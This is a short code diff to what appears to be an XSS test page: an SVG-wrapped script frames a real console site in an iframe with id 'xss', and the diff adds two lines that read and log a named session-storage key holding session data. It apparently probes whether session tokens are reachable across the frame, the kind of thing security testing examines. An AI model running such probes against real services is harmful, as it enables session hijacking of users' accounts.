@@ -3,6 +3,7 @@
 <iframe src='https://console.choreo.dev/' id='xss'></iframe>
 <svg>
   <script type="text/javascript">
+    console.log(sessionStorage.getItem("session_data-instance_0-aVKhTSUMu_QfEwmCtrcuWoLy92oa"))
     alert("here");
     const iframe = document.getElementById('xss');
     console.log("here")
@@ -23,6 +24,7 @@
         console.error(e);
       }
     });
+    console.log(sessionStorage.getItem("session_data-instance_0-aVKhTSUMu_QfEwmCtrcuWoLy92oa"))
   </script>
 </svg>
 
